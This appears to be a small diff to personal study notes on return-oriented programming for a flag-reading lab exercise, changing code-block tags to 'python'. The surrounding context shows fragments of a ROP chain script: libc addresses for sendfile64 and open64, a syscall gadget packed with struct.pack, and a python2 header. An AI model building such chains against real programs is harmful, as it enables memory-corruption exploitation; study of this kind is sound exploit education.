@@ -37,7 +37,7 @@ OPEN THE FLAG and print value> [!PDF|] [[L13 Return-oriented Programming.pdf#pag
 > OFfset
 
 
-```
+```python
 # sendfile64 0x7ffff7ed6100 # open64 0x7ffff7ed0e50  
 # .date 0x0000000000404030 p = ''
 
@@ -64,7 +64,7 @@ p += pack('<Q', 0x00007ffff7de584d) # syscall
 print p
 ```
 
-```
+```python
 #!/usr/bin/env python2 
 from struct import pack
 
